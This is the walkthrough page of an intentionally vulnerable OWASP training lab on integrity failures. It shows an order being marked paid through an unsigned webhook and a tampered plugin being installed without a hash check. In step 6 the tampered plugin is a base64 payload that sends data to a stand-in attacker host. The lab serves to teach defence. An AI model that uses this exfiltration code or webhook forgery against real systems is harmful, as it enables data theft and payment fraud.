---
title: A08 Software or Data Integrity Failures
sidebar_position: 8
---

## Overview

Software or Data Integrity Failures happen when a service trusts data or code without checking that it really came from who it claims to, and that it was not changed on the way. A payment notification that nobody verifies, or a plugin installed without checking its contents, are the classic examples. It is number eight in the OWASP Top 10 (2025).

This lab contains two integrity flaws, both written on purpose:

| Flaw                          | What goes wrong                                                                                         | Endpoints                                  |
| ----------------------------- | ------------------------------------------------------------------------------------------------------- | ------------------------------------------ |
| **Unsigned payment webhook**  | The service marks an order paid because someone POSTed `{"status":"paid"}`, with no proof it is genuine. | `/lab/.../integrity/webhooks/payment`      |
| **Plugin installed unchecked**| A plugin package is installed as received, so a tampered or unknown package runs.                       | `/lab/.../integrity/plugins/install`       |

Every flaw has a vulnerable endpoint under `/lab/vulnerable/...` and a secure endpoint under `/lab/secure/...` that does the same job correctly. Read-only endpoints under `/lab/integrity/...` show the data both sides work with.

## Access the lab

Start the labs as described in the Installation section of the Introduction page. The Software or Data Integrity Failures service then listens on:

| What             | Address                              |
| ---------------- | ------------------------------------ |
| **Swagger UI**   | `http://localhost:5080/swagger`      |
| API base URL     | `http://localhost:5080`              |
| Second HTTP port | `5081` (same service, also plain HTTP) |
| Database         | `SoftwareOrDataIntegrityFailures_LAB` on `sqlserver:1433` |

Open `http://localhost:5080/swagger` in your browser. Swagger is only enabled when `ASPNETCORE_ENVIRONMENT` is `Development`, which the Docker setup already does.

If you run the project from your IDE or with `dotnet run` instead of Docker, use the launch profile: `http` serves `http://localhost:5080`, while `https` serves `https://localhost:5081` and `http://localhost:5080`.

## Seeded data

On first start the service applies its migrations and seeds the database from the JSON files in `src/Context/Data`:

- **`dummy.orders.json`**: orders in the `Pending` state, waiting to be paid.
- **`dummy.trustedplugins.json`**: 2 trusted plugins, the "official" packages, each with its name, version, SHA-256 hash and content.
- **`dummy.users.json`**: 100 users who own the orders.

The order IDs are generated fresh on every start, so this walkthrough has you copy a real one from the orders endpoint in step 1 rather than giving a fixed value. The trusted plugin used below is stable:

| Plugin          | Version | SHA-256 (first bytes) |
| --------------- | ------- | --------------------- |
| `report-export` | `1.0.0` | `72b16e92...`         |

To find more data, visit the [seed data](https://github.com/yagizerdem/OWASP-lab/tree/main/Lab/SoftwareOrDataIntegrityFailures/src/Context/Data) in the repository.

## Response format

Every successful response uses the same JSON envelope:

```json
{
  "message": "Success",
  "data": {},
  "status": 200
}
```

Errors are written by the shared error handler, which uses capitalised keys:

```json
{
  "Message": "Invalid webhook signature",
  "Data": null,
  "Status": 401
}
```

## Endpoints

All paths start with `http://localhost:5080`. None of them expect credentials in a header; the secure webhook uses an `X-Signature` header instead.

| #   | Method | Path                                           | Purpose                                                 |
| --- | ------ | ---------------------------------------------- | ------------------------------------------------------- |
| 1   | `GET`  | `/lab/integrity/orders`                        | List orders with their IDs, amounts and statuses        |
| 2   | `POST` | `/lab/vulnerable/integrity/webhooks/payment`   | Mark an order paid, no verification                     |
| 3   | `POST` | `/lab/secure/integrity/webhooks/payment`       | Mark an order paid only with a valid signature          |
| 4   | `POST` | `/lab/secure/integrity/webhooks/provider-sign` | Dev helper that signs a webhook body for you            |
| 5   | `GET`  | `/lab/integrity/plugins/trusted`               | The trusted manifest (official packages)                |
| 6   | `POST` | `/lab/vulnerable/integrity/plugins/install`    | Install any plugin, no check                            |
| 7   | `POST` | `/lab/secure/integrity/plugins/install`        | Install a plugin only if it matches the manifest        |
| 8   | `GET`  | `/lab/integrity/plugins/installed`             | Everything installed so far, with a `verified` flag     |

## Walkthrough in Swagger

In this walkthrough you are an attacker who never paid for anything and wants free goods, and then wants your own code running inside the app.

### How to send a request in Swagger

Open `http://localhost:5080/swagger`. Every step below follows the same pattern:

1. Find the endpoint in the list and click it to expand it.
2. Click **Try it out**.
3. Paste the values from the step into the JSON **Request body**, or into the header field where the step says so.
4. Click **Execute** and read the status code and body under **Server response**.

You never need the **Authorize** button in this lab.

### Step 1: Find an order to attack

Endpoint: **`GET /lab/integrity/orders`**

This endpoint has no parameters. Click **Execute** and pick any order with `"status": "Pending"`. Copy its `id` and its `amount`:

```json
{
  "id": "e2a1...copy this...9f",
  "userId": "acf7cbf9-109e-460e-914d-c2b42793c233",
  "amount": 147.0,
  "status": "Pending"
}
```

Use that order's ID and amount in the steps below wherever they say `<order id>` and `<amount>`.

### Step 2: Mark the order paid without paying

Endpoint: **`POST /lab/vulnerable/integrity/webhooks/payment`**

A payment provider would normally call this to report that money arrived. There is no check that the call really came from the provider. Paste the order's ID and send `status` as `paid`:

```json
{
  "orderId": "<order id>",
  "status": "paid",
  "amount": 0
}
```

You get `200` and the order is now paid:

```json
{
  "message": "Success",
  "data": { "id": "<order id>", "status": "Paid" },
  "status": 200
}
```

Notice you sent `"amount": 0`. The endpoint never checks the amount against the order, never checks a signature, and would happily "pay" the same order again. Run **`GET /lab/integrity/orders`** to confirm the status stuck.

### Step 3: Try the same trick on the secure webhook

Endpoint: **`POST /lab/secure/integrity/webhooks/payment`**

Pick another `Pending` order for this. Paste the same kind of body:

```json
{
  "orderId": "<order id>",
  "status": "paid",
  "amount": 0
}
```

Leave the `X-Signature` header empty and **Execute**. You get `401` with `Invalid webhook signature`. The secure endpoint requires proof that the message came from the provider, and an unsigned message is refused before anything changes.

### Step 4: Get a genuine signature, then see what it protects

The real provider holds a shared secret and signs each message with it. The lab plays the provider through a dev-only helper so you don't have to compute the HMAC yourself.

Endpoint: **`POST /lab/secure/integrity/webhooks/provider-sign`**

Paste the order's real ID and its real amount:

```json
{
  "orderId": "<order id>",
  "status": "paid",
  "amount": <amount>
}
```

You get back a `rawBody` string and a `signature`:

```json
{
  "data": {
    "rawBody": "{\"orderId\":\"<order id>\",\"status\":\"paid\",\"amount\":147.0}",
    "signature": "9f2c...hex..."
  }
}
```

Now call **`POST /lab/secure/integrity/webhooks/payment`** again. This time put the `signature` value into the `X-Signature` header field, and paste the **exact** `rawBody` as the request body (the signature only matches those exact bytes). You get `200` and the order becomes `Paid`.

This shows what the signature buys you: it is tied to the exact body, so you cannot change the amount after signing. Try it: sign with the real amount, then edit the body to `"amount": 0` before sending. The signature no longer matches and you get `401`. The secure endpoint also checks that the amount equals the order and that the order was still `Pending`, so a paid order cannot be paid twice.

### Step 5: Look at the trusted plugin manifest

Endpoint: **`GET /lab/integrity/plugins/trusted`**

This endpoint has no parameters. Click **Execute**. It returns the official packages, each with the SHA-256 the real package should have and its content as base64:

```json
{
  "name": "report-export",
  "version": "1.0.0",
  "sha256": "72b16e924350854e62349e416190746df3ebf5bac8a4fe83dde3032a5cdb7a96",
  "contentBase64": "ZXhwb3J0IGZ1bmN0aW9uIHJ1bihkYXRhKSB7IHJldHVybiB0b0NzdihkYXRhKTsgfQ=="
}
```

That base64 decodes to the harmless line `export function run(data) { return toCsv(data); }`.

### Step 6: Install a tampered plugin the vulnerable way

Endpoint: **`POST /lab/vulnerable/integrity/plugins/install`**

Imagine you intercepted the download and replaced the code. Install `report-export` 1.0.0, but with your own content. The base64 below decodes to `export function run(data){ fetch("http://evil.example/x?d="+data); }`:

```json
{
  "name": "report-export",
  "version": "1.0.0",
  "contentBase64": "ZXhwb3J0IGZ1bmN0aW9uIHJ1bihkYXRhKXsgZmV0Y2goImh0dHA6Ly9ldmlsLmV4YW1wbGUveD9kPSIrZGF0YSk7IH0="
}
```

You get `200`, and the response shows `"verified": false`:

```json
{
  "data": {
    "name": "report-export",
    "version": "1.0.0",
    "sha256": "<hash of your tampered content>",
    "verified": false
  }
}
```

The service stored your code under the name of a trusted plugin. It never compared the bytes against the manifest, so the modified package is now installed.

### Step 7: Try the same install on the secure endpoint

Endpoint: **`POST /lab/secure/integrity/plugins/install`**

Paste the exact same tampered body as in step 6 and **Execute**. You get `403` with `Plugin hash does not match the trusted manifest`. The secure endpoint computes the SHA-256 of what you sent and compares it with the manifest; because your bytes differ, it is rejected before anything is stored.

Now install the genuine package: copy the real `contentBase64` from step 5 into the body:

```json
{
  "name": "report-export",
  "version": "1.0.0",
  "contentBase64": "ZXhwb3J0IGZ1bmN0aW9uIHJ1bihkYXRhKSB7IHJldHVybiB0b0NzdihkYXRhKTsgfQ=="
}
```

This time you get `200` with `"verified": true`. A plugin that is not in the manifest at all, such as `"name": "something-else"`, is refused with `403` and `Plugin is not in the trusted manifest`.

### Step 8: Compare what got installed

Endpoint: **`GET /lab/integrity/plugins/installed`**

Click **Execute**. You see both installs: the tampered one from step 6 with `"verified": false`, and the genuine one from step 7 with `"verified": true`. The vulnerable endpoint let the unverified code through; the secure one only ever stores verified packages.

:::warning

Steps 2, 4, 6 and 7 change data. To get the original seed data back, run `docker compose down -v` and then `docker compose up -d`. This resets the database of every lab, not just this one.

:::

## What the secure version does differently

- **Webhook (steps 2 to 4):** the provider signs each message with a shared secret (HMAC-SHA256 over the exact body), and the service recomputes and compares that signature in constant time. It also checks the amount against the order and that the order was still pending, so the message cannot be forged, altered or replayed.
- **Plugins (steps 5 to 8):** the package name and version must exist in a trusted manifest, and the SHA-256 of the received bytes must equal the hash in the manifest, so an unknown or modified package is rejected before it is installed.
